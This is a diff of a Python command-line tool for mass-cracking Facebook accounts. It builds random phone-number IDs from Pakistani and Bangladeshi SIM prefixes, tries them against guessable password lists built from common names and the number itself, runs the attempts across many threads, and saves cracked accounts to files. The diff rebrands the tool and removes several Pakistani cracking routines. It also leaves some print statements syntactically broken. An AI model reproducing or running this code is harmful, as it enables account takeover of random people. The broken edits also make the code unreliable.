@@ -146,21 +146,15 @@ awan =[
 'Mozilla/5.0 (Linux; Android 10; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36',
 'Mozilla/5.0 (Linux; Android 10; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36',]
 logo=("""\033[1;97m
-     
-                                                                                                                                                                                     
-                                                                                                                                                                                     
-   
-  \x1b[1;91m____ _  _ ____ _  _ ____ _ ____ ____ 
-[__  |__| |__| |__| |__/ | |__| |__/ 
-___] |  | |  | |  | |  \ | |  | |  \ 
-                                     
-                                                                                                                                                                                     
-                                                                                                                                                                                     
-                                                                                                                                                                                     
-                                                                                                                                                                                     
-                                                                                                                                                                                     
-                                                                                                                                                                                     
-                                                                                                                                                                                     
+
+ _____ _    _          _    _ _____  _____          _____  
+   / ____| |  | |   /\   | |  | |  __ \|_   _|   /\   |  __ \ 
+    | (___ | |__| |  /  \  | |__| | |__) | | |    /  \  | |__) |
+      \___ \|  __  | / /\ \ |  __  |  _  /  | |   / /\ \ |  _  / 
+      ____) | |  | |/ ____ \| |  | | | \ \ _| |_ / ____ \| | \ \ 
+       |_____/|_|  |_/_/    \_\_|  |_|_|  \_\_____/_/    \_\_|  \_\
+                                                             
+                                                             
 
 \33[1;37m----------------------------------------------
 →   Owner      :  SHAHRIAR AHMED
@@ -186,7 +180,7 @@ def menu():
 			os.system('clear')
 			print(logo)
 			print('[1] File Cloning menu')
-			print('[2] Pak Random Cloning menu')
+			print('[2]   \x1b[1;91m OFF')
 			print('[3] BD  Random Cloning menu')
 			print('[4] Random Choice Pass ')
 			print('[5] Get any  number data')
@@ -200,7 +194,7 @@ def menu():
 				print(logo)
 				
 				linex()
-				print(' Example : /sdcard/NOOB.txt')
+				print(' Example : /storage/emulated/0/SHAHRIAR)
 				linex()
 				file = input(' Put file path\033[1;37m: ')
 				try:
@@ -274,7 +268,7 @@ def menu():
 			elif rifat in ['6','06']:
 				cinc()
 			elif rifat in ['7','07']:
-				os.system('xdg-open https://www.facebook.com/R1F4T.OFFICIAL.ACCOUNT');menu()
+				os.system('xdg-open https://www.facebook.com/ja.aminur');menu()
 			elif rifat in ['8','08']:
 				exit('')
 			else:
@@ -421,77 +415,8 @@ def rifat1():
 	if opt =='6':
 		random_number6()
 	
-	else:
-		print('\n\033[1;31mChoose valid option\033[0;97m')
-		menu()
-#____
-def random_number1():
-	uid=[]
-	os.system('clear')
-	print(logo)
-	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
-	linex()
-	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
-	os.system('clear')
-	print(logo)
-	print(' Example : 1000,5000,10000,****Etc')
-	linex()
-	limit = int(input('[+] Putt Ypur Idz lemit :  '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		uid.append(nmp)
-	with ThreadPool(max_workers=35) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(uid))
-		print(' Total Acounts : '+tl)
-		print(' Selected Code : \x1b[1;92m'+kode)
-		print('\x1b[1;91m If you no result use flight mode')
-		linex()
-		for guru in uid:
-			uid = kode+guru
-			pwx = [guru,kode]
-			yaari.submit(fcrack,uid,pwx,tl)
-	linex()
-	print('[✓] Crack process has been completed')
-	print('[?] Idz saved in [ok.txt,cp.txt]')
-	linex()
-	input('Press Enter To Go Back To Menu')
-	menu()
-#____
-def random_number2():
-	uid=[]
-	os.system('clear')
-	print(logo)
-	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
-	linex()
-	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
-	os.system('clear')
-	print(logo)
-	linex()
-	print(' Example : 1000,5000,10000,****Etc')
-	limit = int(input('[+] Putt Ypur Idz lemit :  '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		uid.append(nmp)
-	with ThreadPool(max_workers=35) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(uid))
-		print(' Total Acounts : '+tl)
-		print(' Selected Code : \x1b[1;92m'+kode)
-		print('\x1b[1;91m If you no result use flight mode')
-		linex()
-		for guru in uid:
-			uid = kode+guru
-			pwx = [guru,kode+guru]
-			yaari.submit(fcrack,uid,pwx,tl)
-	linex()
-	print('[✓] Crack process has been completed')
-	print('[?] Idz saved in [ok.txt,cp.txt]')
-	linex()
-	input('Press Enter To Go Back To Menu')
-	menu()
+	
+
 #____________
 def bd():
 	os.system('clear')
@@ -513,154 +438,19 @@ def bd():
 	else:
 		print(' Select option');menu()
 
-#_______
-def random_number3():
-	uid=[]
-	os.system('clear')
-	print(logo)
-	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
-	linex()
-	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
-	os.system('clear')
-	print(logo)
-	linex()
-	print(' Example : 1000,5000,10000,****Etc')
-	limit = int(input('[+] Putt Ypur Idz lemit :  '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		uid.append(nmp)
-	with ThreadPool(max_workers=35) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(uid))
-		print(' Total Acounts : '+tl)
-		print(' Selected Code : \x1b[1;92m'+kode)
-		print('\x1b[1;91m If you no result use flight mode')
-		linex()
-		for guru in uid:
-			uid = kode+guru
-			pwx = [guru,kode,'khankhan','khan12','khan1122']
-			yaari.submit(fcrack,uid,pwx,tl)
-	linex()
-	print('[✓] Crack process has been completed')
-	print('[?] Idz saved in [ok.txt,cp.txt]')
-	linex()
-	input('Press Enter To Go Back To Menu')
-	menu()
-#___________
-def random_number4():
-	uid=[]
-	os.system('clear')
-	print(logo)
-	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
-	linex()
-	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
-	os.system('clear')
-	print(logo)
-	linex()
-	print(' Example : 1000,5000,10000,****Etc')
-	limit = int(input('[+] Putt Ypur Idz lemit :  '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		uid.append(nmp)
-	with ThreadPool(max_workers=35) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(uid))
-		print(' Total Acounts : '+tl)
-		print(' Selected Code : \x1b[1;92m'+kode)
-		print('\x1b[1;91m If you no result use flight mode')
-		linex()
-		for guru in uid:
-			uid = kode+guru
-			pwx = [guru,kode+guru,'khan786','khan44','khan12','khan1122']
-			yaari.submit(fcrack,uid,pwx,tl)
-	linex()
-	print('[✓] Crack process has been completed')
-	print('[?] Idz saved in [ok.txt,cp.txt]')
-	linex()
-	input('Press Enter To Go Back To Menu')
-	menu()
-#_____
-def random_number5():
-	uid=[]
-	os.system('clear')
-	print(logo)
-	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
-	linex()
-	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
-	os.system('clear')
-	print(logo)
-	linex()
-	print(' Example : 1000,5000,10000,****Etc')
-	limit = int(input('[+] Putt Ypur Idz lemit :  '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		uid.append(nmp)
-	with ThreadPool(max_workers=35) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(uid))
-		print(' Total Acounts : '+tl)
-		print(' Selected Code : \x1b[1;92m'+kode)
-		print('\x1b[1;91m If you no result use flight mode')
-		linex()
-		for guru in uid:
-			uid = kode+guru
-			pwx = [guru,kode+guru,'khan123456','janjan','jan12345','khan1122','khan12']
-			yaari.submit(fcrack,uid,pwx,tl)
-	linex()
-	print('[✓] Crack process has been completed')
-	print('[?] Idz saved in [ok.txt,cp.txt]')
-	linex()
-	input('Press Enter To Go Back To Menu')
-	menu()
-#___
-def random_number6():
-	uid=[]
-	os.system('clear')
-	print(logo)
-	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
-	linex()
-	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
-	os.system('clear')
-	print(logo)
-	linex()
-	print(' Example : 1000,5000,10000,****Etc')
-	limit = int(input('[+] Putt Ypur Idz lemit :  '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		uid.append(nmp)
-	with ThreadPool(max_workers=35) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(uid))
-		print(' Total Acounts : '+tl)
-		print(' Selected Code : \x1b[1;92m'+kode)
-		print('\x1b[1;91m If you no result use flight mode')
-		linex()
-		for guru in uid:
-			uid = kode+guru
-			pwx = [guru,kode+guru,'baloch','malik12','baloch12','baloch12345','malik12345']
-			yaari.submit(fcrack,uid,pwx,tl)
-	linex()
-	print('[✓] Crack process has been completed')
-	print('[?] Idz saved in [ok.txt,cp.txt]')
-	linex()
-	input('Press Enter To Go Back To Menu')
-	menu()
+
 #____
 def bd1():
 	uid=[]
 	os.system('clear')
 	print(logo)
-	print('[√] EXAMPLE : 88***,88***,88***,.ETC')
+	print('[√] EXAMPLE : +88017,+88013,+88019,.ETC')
 	linex()
 	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
 	os.system('clear')
 	print(logo)
-	print(' Example : 1000,5000,10000,****Etc')
-	limit = int(input('[+] Putt Ypur Idz lemit :  '))
+	print(' Example : 3000,5000,10000,****Etc')
+	limit = int(input('[+] Put Your Id limit :  '))
 	for nmbr in range(limit):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
 		uid.append(nmp)
@@ -669,7 +459,7 @@ def bd1():
 		print(logo)
 		tl = str(len(uid))
 		print(' Total Acounts : '+tl)
-		print(' Selected Code : \x1b[1;92m'+kode)
+		print(' Selected Code : \x1b[1;92mkode)
 		print('\x1b[1;91m If you no result use flight mode')
 		linex()
 		for guru in uid:
@@ -683,72 +473,7 @@ def bd1():
 	input('Press Enter To Go Back To Menu')
 	menu()
 
-#___
-def bd2():
-	uid=[]
-	os.system('clear')
-	print(logo)
-	print('[√] EXAMPLE : 88***,88***,88***,.ETC')
-	linex()
-	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
-	os.system('clear')
-	print(logo)
-	print(' Example : 1000,5000,10000,****Etc')
-	limit = int(input('[+] Putt Ypur Idz lemit :  '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		uid.append(nmp)
-	with ThreadPool(max_workers=35) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(uid))
-		print(' Total Acounts : '+tl)
-		print(' Selected Code : \x1b[1;92m'+kode)
-		print('\x1b[1;91m If you no result use flight mode')
-		linex()
-		for guru in uid:
-			uid = kode+guru
-			pwx = [guru,kode,'free fire','bangladish','freefire']
-			yaari.submit(fcrack,uid,pwx,tl)
-	linex()
-	print('[✓] Crack process has been completed')
-	print('[?] Idz saved in [ok.txt,cp.txt]')
-	linex()
-	input('Press Enter To Go Back To Menu')
-	menu()
-#___
-def bd3():
-	uid=[]
-	os.system('clear')
-	print(logo)
-	print('[√] EXAMPLE : 88***,88***,88***,.ETC')
-	linex()
-	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
-	os.system('clear')
-	print(logo)
-	print(' Example : 1000,5000,10000,****Etc')
-	limit = int(input('[+] Putt Ypur Idz lemit :  '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		uid.append(nmp)
-	with ThreadPool(max_workers=35) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(uid))
-		print(' Total Acounts : '+tl)
-		print(' Selected Code : \x1b[1;92m'+kode)
-		print('\x1b[1;91m If you no result use flight mode')
-		linex()
-		for guru in uid:
-			uid = kode+guru
-			pwx = [guru,kode,'puja12','islam12345','islam1122']
-			yaari.submit(fcrack,uid,pwx,tl)
-	linex()
-	print('[✓] Crack process has been completed')
-	print('[?] Idz saved in [ok.txt,cp.txt]')
-	linex()
-	input('Press Enter To Go Back To Menu')
-	menu()
+
 #___
 def chos():
     user=[]
